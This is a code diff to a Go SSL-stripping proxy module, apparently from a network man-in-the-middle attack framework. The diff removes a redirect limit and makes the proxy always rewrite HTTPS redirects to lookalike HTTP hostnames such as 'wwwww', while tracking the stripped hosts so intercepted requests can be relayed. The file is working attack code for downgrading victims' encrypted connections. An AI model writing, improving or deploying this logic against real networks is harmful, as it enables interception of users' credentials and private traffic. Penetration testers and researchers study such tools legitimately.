@@ -21,7 +21,6 @@ import (
 )
 
 var (
-	maxRedirs        = 5
 	httpsLinksParser = regexp.MustCompile(`https://[^"'/]+`)
 	subdomains       = map[string]string{
 		"www":     "wwwww",
@@ -240,8 +239,8 @@ func (s *SSLStripper) processURL(url string) string {
 	// search for a known subdomain and replace it
 	found := false
 	for sub, repl := range subdomains {
-		what := fmt.Sprintf("://%s", sub)
-		with := fmt.Sprintf("://%s", repl)
+		what := fmt.Sprintf("://%s.", sub)
+		with := fmt.Sprintf("://%s.", repl)
 		if strings.Contains(url, what) {
 			url = strings.Replace(url, what, with, 1)
 			found = true
@@ -269,18 +268,13 @@ func (s *SSLStripper) Preprocess(req *http.Request, ctx *goproxy.ProxyCtx) (redi
 	// preprocess request headers
 	s.stripRequestHeaders(req)
 
-	// well ...
-	if req.URL.Scheme == "https" {
-		// TODO: check for max redirects?
-		req.URL.Scheme = "http"
-	}
-
 	// handle stripped domains
 	original := s.hosts.Unstrip(req.Host)
 	if original != nil {
 		log.Info("[%s] Replacing host %s with %s in request from %s", core.Green("sslstrip"), core.Bold(req.Host), core.Yellow(original.Hostname), req.RemoteAddr)
 		req.Host = original.Hostname
 		req.URL.Host = original.Hostname
+		req.URL.Scheme = "https"
 		req.Header.Set("Host", original.Hostname)
 	}
 
@@ -295,34 +289,13 @@ func (s *SSLStripper) Preprocess(req *http.Request, ctx *goproxy.ProxyCtx) (redi
 	return
 }
 
-func (s *SSLStripper) isMaxRedirs(hostname string) bool {
-	// did we already track redirections for this host?
-	if nredirs, found := s.redirs[hostname]; found == true {
-		// reached the threshold?
-		if nredirs >= maxRedirs {
-			log.Warning("[%s] Hit max redirections for %s, serving HTTPS.", core.Green("sslstrip"), hostname)
-			// reset
-			delete(s.redirs, hostname)
-			return true
-		} else {
-			// increment
-			s.redirs[hostname]++
-		}
-	} else {
-		// start tracking redirections
-		s.redirs[hostname] = 1
-	}
-
-	return false
-}
-
 func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
 	if s.enabled == false {
 		return
 	}
 
 	// is the server redirecting us?
-	if res.StatusCode != 200 {
+	if res.StatusCode != 201 {
 		// extract Location header
 		if location, err := res.Location(); location != nil && err == nil {
 			orig := res.Request.URL
@@ -335,17 +308,12 @@ func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
 
 				log.Info("[%s] Got redirection from HTTPS to HTTP: %s -> %s", core.Green("sslstrip"), core.Yellow("http://"+origHost), core.Bold("https://"+newHost))
 
-				// if we still did not reach max redirections, strip the URL down to
-				// an alternative HTTP version
-				if s.isMaxRedirs(origHost) {
-					strippedURL := s.processURL(newURL)
-					u, _ := url.Parse(strippedURL)
-					hostStripped := u.Hostname()
-
-					s.hosts.Track(origHost, hostStripped)
-
-					res.Header.Set("Location", strippedURL)
-				}
+				// strip the URL down to an alternative HTTP version
+				strippedURL := s.processURL(newURL)
+				u, _ := url.Parse(strippedURL)
+				hostStripped := u.Hostname()
+				s.hosts.Track(origHost, hostStripped)
+				res.Header.Set("Location", strippedURL)
 			}
 		}
 	}
